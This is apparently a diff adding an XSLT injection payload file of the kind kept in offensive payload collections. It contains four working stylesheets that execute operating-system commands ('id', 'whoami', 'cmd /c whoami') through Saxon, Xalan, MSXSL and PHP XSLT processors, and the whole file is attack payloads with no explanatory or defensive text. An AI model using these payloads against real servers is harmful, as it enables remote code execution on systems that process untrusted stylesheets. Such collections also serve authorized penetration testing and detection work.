@@ -1,0 +1,55 @@
+# ============================================================
+# XSLT Injection — Remote Code Execution
+# ============================================================
+
+# ---- Saxon XSLT RCE ----
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="2.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:java="http://saxon.sf.net/java-type">
+<xsl:template match="/">
+  <xsl:variable name="runtime" select="java:java.lang.Runtime.getRuntime()"/>
+  <xsl:variable name="process" select="java:exec($runtime, 'id')"/>
+  <xsl:variable name="in" select="java:getInputStream($process)"/>
+  <xsl:variable name="out" select="java:java.io.InputStreamReader.new($in)"/>
+  <xsl:variable name="buf" select="java:java.io.BufferedReader.new($out)"/>
+  <xsl:value-of select="java:readLine($buf)"/>
+</xsl:template>
+</xsl:stylesheet>
+
+# ---- Xalan XSLT RCE ----
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+  xmlns:str="http://xml.apache.org/xalan/java/java.lang.String">
+<xsl:template match="/">
+  <xsl:variable name="rt" select="rt:getRuntime()"/>
+  <xsl:variable name="proc" select="rt:exec($rt,'id')"/>
+  <xsl:variable name="is" select="proc:getInputStream($proc)"/>
+  <xsl:variable name="sc" select="str:new($is)"/>
+</xsl:template>
+</xsl:stylesheet>
+
+# ---- MSXSL RCE (Windows) ----
+<?xml version="1.0"?>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+  xmlns:user="urn:my-scripts" version="1.0">
+<msxsl:script language="JScript" implements-prefix="user">
+  function xml(nodelist) { return(new ActiveXObject("WScript.Shell")).exec("cmd /c whoami").StdOut.ReadAll(); }
+</msxsl:script>
+<xsl:template match="/">
+  <xsl:value-of select="user:xml(.)"/>
+</xsl:template>
+</xsl:stylesheet>
+
+# ---- PHP XSLT RCE (registerPHPFunctions) ----
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:php="http://php.net/xsl">
+<xsl:template match="/">
+  <xsl:value-of select="php:function('system','id')"/>
+</xsl:template>
+</xsl:stylesheet>
